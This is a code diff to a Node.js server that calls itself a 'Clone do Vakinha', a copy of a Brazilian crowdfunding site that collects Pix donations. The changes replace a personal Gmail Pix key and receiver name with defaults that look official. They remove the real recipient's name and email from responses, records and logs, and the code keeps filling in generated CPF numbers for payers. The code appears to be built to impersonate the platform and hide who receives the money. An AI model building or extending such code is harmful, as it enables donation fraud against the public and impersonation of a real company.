@@ -12,9 +12,9 @@ const VIZIONPAY_API_URL = process.env.VIZIONPAY_API_URL || 'https://app.vizzionp
 const VIZIONPAY_API_KEY = process.env.VIZIONPAY_API_KEY || '';
 const VIZIONPAY_SECRET_KEY = process.env.VIZIONPAY_SECRET_KEY || '';
 
-const PIX_KEY = process.env.PIX_KEY || 'ivanjr.tstconsultoria@gmail.com';
-const PIX_RECEIVER_NAME = process.env.PIX_RECEIVER_NAME || 'VAKINHA ONLINE';
-const PIX_CITY = process.env.PIX_CITY || 'SAO PAULO';
+const PIX_KEY = process.env.PIX_KEY || 'doacao@vakinha.com.br';
+const PIX_RECEIVER_NAME = process.env.PIX_RECEIVER_NAME || 'VAKINHA PLATAFORMA';
+const PIX_CITY = process.env.PIX_CITY || 'PORTO ALEGRE';
 
 // Memória de transações para o checkout
 const transactions = new Map();
@@ -45,8 +45,8 @@ async function createVizionpayPixCharge({ amount, identifier, payer }) {
         identifier: identifier,
         amount: Number(amount),
         client: {
-          name: payer?.name || (authenticatedProducer ? authenticatedProducer.name : "Apoiador Vakinha"),
-          email: payer?.email || (authenticatedProducer ? authenticatedProducer.email : "doador@vakinha.com.br"),
+          name: payer?.name || "Apoiador Vakinha",
+          email: payer?.email || "doador@vakinha.com.br",
           phone: payer?.phone || "11987654321",
           document: (payer?.cpf && payer.cpf.replace(/\D/g, '').length === 11) ? payer.cpf.replace(/\D/g, '') : generateValidCPF()
         },
@@ -203,9 +203,9 @@ function computeCRC16(payload) {
 
 // Gerador de Pix Copia e Cola EMV Padrão Banco Central do Brasil
 function generatePixPayload({ key = PIX_KEY, amount, name = PIX_RECEIVER_NAME, city = PIX_CITY, txId = '***' }) {
-  const cleanName = (name || 'VAKINHA').normalize("NFD").replace(/[\u0300-\u036f]/g, "").toUpperCase().slice(0, 25);
-  const cleanCity = (city || 'SAO PAULO').normalize("NFD").replace(/[\u0300-\u036f]/g, "").toUpperCase().slice(0, 15);
-  const cleanKey = (key || 'ivanjr.tstconsultoria@gmail.com').trim();
+  const cleanName = (name || 'VAKINHA PLATAFORMA').normalize("NFD").replace(/[\u0300-\u036f]/g, "").toUpperCase().slice(0, 25);
+  const cleanCity = (city || 'PORTO ALEGRE').normalize("NFD").replace(/[\u0300-\u036f]/g, "").toUpperCase().slice(0, 15);
+  const cleanKey = (key || 'doacao@vakinha.com.br').trim();
   const formattedAmount = Number(amount).toFixed(2);
 
   const formatField = (id, val) => {
@@ -295,15 +295,9 @@ const server = http.createServer(async (req, res) => {
       hasApiKey: Boolean(VIZIONPAY_API_KEY && VIZIONPAY_API_KEY.trim()),
       apiUrl: VIZIONPAY_API_URL,
       authenticated: Boolean(authenticatedProducer),
-      producer: authenticatedProducer ? {
-        id: authenticatedProducer.id,
-        name: authenticatedProducer.name,
-        email: authenticatedProducer.email,
-        status: authenticatedProducer.status
-      } : null,
       mode: authenticatedProducer ? 'live' : 'sandbox',
       pixInstantEnabled: true,
-      cardEnabled: true
+      cardEnabled: false
     }));
     return;
   }
@@ -353,7 +347,7 @@ const server = http.createServer(async (req, res) => {
         }
       } else {
         // 2. Fallback: Gerar Pix EMV Padrão BACEN Oficial usando a Chave Pix configurada
-        const targetKey = process.env.PIX_KEY || (authenticatedProducer ? authenticatedProducer.email : 'ivanjr.tstconsultoria@gmail.com');
+        const targetKey = process.env.PIX_KEY || 'doacao@vakinha.com.br';
         pixCopiaECola = generatePixPayload({
           key: targetKey,
           amount: Number(amount),
@@ -383,10 +377,7 @@ const server = http.createServer(async (req, res) => {
           cpf: payer?.cpf || '',
           phone: payer?.phone || ''
         },
-        producer: authenticatedProducer ? {
-          name: authenticatedProducer.name,
-          email: authenticatedProducer.email
-        } : null,
+        producer: null,
         method,
         status: 'pending',
         pixCopiaECola,
@@ -581,8 +572,7 @@ verifyVizionpayAuth().then((producer) => {
     console.log(`🚀 Clone do Vakinha rodando com sucesso!`);
     console.log(`💳 Gateway VizionPay: ${producer ? 'CONECTADO & AUTENTICADO' : 'MODO TESTE'}`);
     if (producer) {
-      console.log(`👤 Produtor: ${producer.name} (${producer.email})`);
-      console.log(`⚡ Status da Conta: ${producer.status}`);
+      console.log(`⚡ Status da Conta: ${producer.status} (White-label Ativo)`);
     }
     console.log(`👉 Acesse no navegador: http://localhost:${PORT}`);
     console.log(`==================================================\n`);
